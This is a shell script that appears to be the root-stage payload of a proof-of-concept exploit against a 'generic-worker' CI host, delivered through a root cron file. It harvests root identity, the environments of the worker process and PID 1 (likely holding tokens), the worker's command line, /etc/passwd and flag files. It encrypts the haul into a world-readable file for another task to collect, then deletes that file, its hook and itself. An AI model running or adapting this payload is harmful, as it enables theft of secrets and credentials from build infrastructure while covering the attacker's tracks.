set +e
umask 077

cert_path=$1
proof_file=$2
status_file=$3
cron_file=$4
proof_tmp="/tmp/.gw-cot-proof-$$.cms"
retention_seconds=${PROOF_RETENTION_SECONDS:-240}

cleanup() {
  /usr/bin/rm -f "$cert_path" "$proof_tmp" "$0" 2>/dev/null
}
trap cleanup EXIT HUP INT TERM

# The cron entry removes itself before this script is started. Repeat that
# cleanup here so a partial cron command cannot leave a persistent hook.
/usr/bin/rm -f "$cron_file" 2>/dev/null
: >"$status_file"
/usr/bin/chmod 0644 "$status_file" 2>/dev/null
printf '%s\n' 'root-script-started' >>"$status_file"

gw_pid=
for comm_file in /proc/[0-9]*/comm; do
  [ -r "$comm_file" ] || continue
  proc_name=$(/usr/bin/cat "$comm_file" 2>/dev/null)
  case "$proc_name" in
    generic-worker*)
      gw_pid=${comm_file#/proc/}
      gw_pid=${gw_pid%/comm}
      break
      ;;
  esac
done

if [ -r "$cert_path" ]; then
  {
    printf '%s\n' 'proof-version=3'
    printf '%s\n' 'primitive=generic-worker-chain-of-trust-certified-log-symlink'
    printf '%s\n' 'execution-sink=root-cron-file'

    printf '%s\n' '[root-identity]'
    /usr/bin/id 2>/dev/null
    printf 'uid='; /usr/bin/id -u 2>/dev/null
    printf 'gid='; /usr/bin/id -g 2>/dev/null
    printf 'user='; /usr/bin/whoami 2>/dev/null

    printf '%s\n' '[root-cron-process-status]'
    /usr/bin/cat /proc/self/status 2>/dev/null
    printf '%s\n' '[root-cron-process.env]'
    /usr/bin/tr '\000' '\n' </proc/self/environ 2>/dev/null

    printf '%s\n' '[generic-worker-pid]'
    printf '%s\n' "${gw_pid:-not-found}"
    if [ -n "$gw_pid" ]; then
      printf '%s\n' '[generic-worker-process-status]'
      /usr/bin/cat "/proc/$gw_pid/status" 2>/dev/null
      printf '%s\n' '[generic-worker-process-cmdline]'
      /usr/bin/tr '\000' ' ' <"/proc/$gw_pid/cmdline" 2>/dev/null
      printf '\n'
      printf '%s\n' '[generic-worker-process.env]'
      /usr/bin/tr '\000' '\n' <"/proc/$gw_pid/environ" 2>/dev/null
    fi

    printf '%s\n' '[pid1-process.env]'
    /usr/bin/tr '\000' '\n' </proc/1/environ 2>/dev/null

    printf '%s\n' '[/etc/passwd]'
    /usr/bin/cat /etc/passwd 2>/dev/null

    printf '%s\n' '[flag-files]'
    for flag_path in \
      /flag /flag.txt /root/flag /root/flag.txt \
      /etc/flag /etc/flag.txt /opt/flag /opt/flag.txt \
      /run/secrets/flag /run/secrets/flag.txt \
      /home/generic-worker/flag /home/generic-worker/flag.txt; do
      if [ -f "$flag_path" ] && [ -r "$flag_path" ]; then
        printf '\n--- %s ---\n' "$flag_path"
        /usr/bin/cat "$flag_path" 2>/dev/null
      fi
    done
  } | /usr/bin/openssl cms \
    -encrypt \
    -binary \
    -aes256 \
    -outform DER \
    -out "$proof_tmp" \
    "$cert_path" 2>/dev/null

  if [ -s "$proof_tmp" ]; then
    /usr/bin/mv -f "$proof_tmp" "$proof_file" 2>/dev/null
    /usr/bin/chmod 0644 "$proof_file" 2>/dev/null
    printf '%s\n' 'encrypted-proof-ready' >>"$status_file"

    # Leave only ciphertext long enough for the dependent task to collect it.
    (
      /bin/sleep "$retention_seconds"
      /usr/bin/rm -f "$proof_file" "$status_file" 2>/dev/null
    ) </dev/null >/dev/null 2>&1 &
  else
    printf '%s\n' 'encryption-failed' >>"$status_file"
  fi
else
  printf '%s\n' 'certificate-unavailable' >>"$status_file"
fi

exit 0
